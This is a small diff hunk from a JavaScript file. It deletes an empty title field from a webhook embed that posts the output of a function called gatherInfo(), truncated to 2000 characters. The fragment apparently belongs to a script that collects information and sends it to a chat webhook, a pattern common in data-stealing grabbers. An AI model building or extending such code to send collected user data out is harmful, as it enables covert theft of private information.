@@ -228,7 +228,6 @@ gatherInfo().then(async () => {
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       embeds: [{
-        title: "",
         description: "```" + infoText.substring(0, 2000) + "```",
         color: 0x010101,
         timestamp: new Date()
